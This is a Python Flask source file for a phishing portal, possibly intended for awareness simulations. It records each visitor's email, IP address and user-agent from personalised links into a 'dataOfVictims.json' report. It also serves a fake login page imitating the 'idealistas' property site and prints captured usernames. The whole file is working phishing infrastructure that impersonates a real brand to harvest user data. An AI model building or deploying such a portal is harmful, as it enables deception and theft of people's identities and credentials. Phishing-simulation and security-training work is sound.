#Web Portal
import atexit
import json
from helper.helper import saveReportAndTemplates,getPath
from flask import Flask, request, jsonify, render_template ,redirect, url_for

#Generating of an URL to access
app=Flask(__name__)
#Data Storage
dataEntry=[]
numEntries=0
print("Generating the Url to make the phishing")
userData={}
@app.route('/user/<userName>',methods=['GET'])
def getInfoUser(userName):
    
    global dataEntry, numEntries
    #Get ip of the client
    client_ip= request.remote_addr
    
    #Get user-agent headers 
    user_agent = request.headers.get('User-Agent')
    
    #Add a new entry
    numEntries+=1
    
    #Adding data intern db 
    clientInfo={
        'user_id': numEntries,
        'user-mail': userName,
        'ip': client_ip,
        'user_agent': user_agent
    }
    dataEntry.append(clientInfo)
    
    #Generate json to save results
    report=json.dumps(clientInfo,indent=4)
    fileReports=open("reportsCampana/dataOfVictims.json","a+")
    fileReports.write(report)
    fileReports.close()
    return jsonify({'message': 'Entry added successfully! You was phished :)', 'data_count': numEntries})

@app.route('/report',methods=['GET'])
def prevewReport():
    global dataEntry, numEntries
    report=jsonify({'data': dataEntry, 'data_count': numEntries})
    return report

@app.route('/idealistas/login',methods=['GET'])
def idealistaForm():
    print()
    return render_template('spanish/html/idealistasLogin.html')

@app.route('/idealistas/login',methods=['POST'])
def idealista():
    username= request.form['username']
    print("\n user:"+username+" was phished")


#incluir mas portales de acceso vía flask...


#When the app exit save the report
atexit.register(saveReportAndTemplates)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)